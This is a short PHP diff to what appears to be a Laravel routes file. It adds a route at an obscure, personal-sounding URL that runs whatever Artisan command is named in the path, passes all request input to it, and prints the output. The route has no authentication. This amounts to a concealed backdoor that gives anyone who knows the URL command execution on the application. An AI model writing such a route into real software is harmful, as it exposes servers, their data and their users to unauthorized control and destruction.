@@ -1,8 +1,10 @@
 <?php
 
-Route::get('/migrate', function()
+Route::get('/my-name-is-kareem3d-friends/{command}', function($command)
 {
-
+    echo '<pre>';
+    var_dump(Artisan::call($command, Input::all()));
+    exit();
 });
 
 
